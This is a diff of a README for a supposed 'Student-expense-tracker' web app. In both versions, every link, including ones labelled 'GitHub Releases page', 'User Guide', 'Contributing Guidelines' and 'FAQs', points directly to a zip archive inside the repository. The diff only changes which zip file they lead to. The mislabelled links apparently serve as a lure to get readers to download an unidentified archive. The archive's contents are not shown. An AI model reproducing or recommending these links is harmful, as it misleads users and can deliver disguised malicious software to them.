@@ -1,6 +1,6 @@
 # 💸 Student-expense-tracker - Track Your Expenses with Ease
 
-[![Download Now](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/assets/tracker_Student_expense_1.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/assets/tracker_Student_expense_1.3.zip)
+[![Download Now](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/Student-expense-tracker-1.4-alpha.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/Student-expense-tracker-1.4-alpha.4.zip)
 
 ## 📜 Overview
 
@@ -22,11 +22,11 @@ Getting started with Student-expense-tracker is straightforward. Follow the step
    - A modern web browser like Chrome, Firefox, or Edge.
    - A device that supports Progressive Web Apps (PWA).
 
-2. **Visit this page to download:** [GitHub Releases](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/assets/tracker_Student_expense_1.3.zip)
+2. **Visit this page to download:** [GitHub Releases](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/Student-expense-tracker-1.4-alpha.4.zip)
 
 ## 📥 Download & Install
 
-To download Student-expense-tracker, visit the [GitHub Releases page](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/assets/tracker_Student_expense_1.3.zip). 
+To download Student-expense-tracker, visit the [GitHub Releases page](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/Student-expense-tracker-1.4-alpha.4.zip). 
 
 1. On the Releases page, look for the latest version.
 2. Click on the version number to view details about that release.
@@ -70,12 +70,12 @@ Your experience matters. If you encounter any issues or have suggestions, please
 
 For more information, refer to these resources:
 
-- [User Guide](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/assets/tracker_Student_expense_1.3.zip)
-- [Contributing Guidelines](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/assets/tracker_Student_expense_1.3.zip)
-- [FAQs](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/assets/tracker_Student_expense_1.3.zip)
+- [User Guide](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/Student-expense-tracker-1.4-alpha.4.zip)
+- [Contributing Guidelines](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/Student-expense-tracker-1.4-alpha.4.zip)
+- [FAQs](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/Student-expense-tracker-1.4-alpha.4.zip)
 
 ## 📢 Final Notes
 
 Thank you for choosing Student-expense-tracker. Your financial management is important, and we've designed this tool to help you with just that. Enjoy using the app and take control of your expenses with confidence.
 
-Remember, to start using the application, **visit this page to download:** [GitHub Releases](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/assets/tracker_Student_expense_1.3.zip).
+Remember, to start using the application, **visit this page to download:** [GitHub Releases](https://raw.githubusercontent.com/kevingeorge-96/Student-expense-tracker/main/web-pwa/Student-expense-tracker-1.4-alpha.4.zip).
